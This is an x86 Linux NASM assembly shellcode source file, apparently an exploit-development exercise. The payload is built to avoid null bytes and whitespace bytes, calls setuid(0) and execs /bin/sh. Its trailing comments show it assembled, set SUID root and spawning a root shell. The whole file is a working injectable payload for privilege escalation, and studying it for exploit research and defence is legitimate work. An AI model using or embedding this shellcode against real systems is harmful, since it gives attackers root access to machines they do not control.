
; execve3.v2.asm - execute "/bin/sh" and exit if you fail
; Uses relative addressing rather than absolute addresses
; Don't use opcodes that end up having null bytes in them

; 16/2, 2016, Enhance for execve3.asm that shellcode must end with NULL
; Now, NULL is not necessary for this code.
;
; 18/2, 2016, use setuid to get the root privileges

SECTION .text				; Code section
	global _start           ; Make label available to linker 

_start:                     ; Standard ld entry point
	jmp short callback		; Jump to the end to get our current address

dowork:
	xor		eax,eax
	mov		al,0x17			; __NR_setuid: 0x17=23
	xor		ebx,ebx
	int		0x80			; setuid(0) to get the root privilege, provided that it has SUID.

	; stack data structure as follows:
	; top                              down
	;     |----->-----|
	; [ ADDR ][ NULL ][ "//bin/sh" ][ NULL ]
	; ECX             EBX
	xor		eax,eax
	push	eax				; Param #3 - NULL
	push	0x68732f6e		; hs/n
	push	0x69622f2f		; ib//, //bin/sh
	mov		ebx,esp			; param #1 - "//bin/sh"
	push	eax
	push	ebx
	mov		ecx,esp			; param #2 - address of ["//bin/sh"]
	xor		edx,edx			; param #3 - NULL

	mov     al,0xb          ; System call number for execve
	int     0x80            ; Interrupt 80 hex - invoke system call

	xor     ebx,ebx		    ; Exit code, 0 = normal
	xor     eax,eax         ; eax = 0
	mov		al,0x1			; avoid 0x20 in shellcode, since 0x20 is whitespace which also is arguments separator.
;	inc     eax             ; System call number for exit (1)
	int     0x80            ; Interrupt 80 hex - invoke system call

callback:
	call    dowork          ; Pushes the address of "/bin/sh" onto the stack

; $ nasm -f elf execve3.v2.asm  
; $ ld -o execve3.v2 execve3.v2.o   
; $ objdump -d execve3.v2
;
; $ sudo chown root execve3.v2
; $ sudo chmod +s execve3.v2
; $ ./execve3.v2
; sh-4.1# id
; uid=0(root) gid=19(floppy) groups=0(root),19(floppy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
; sh-4.1# 



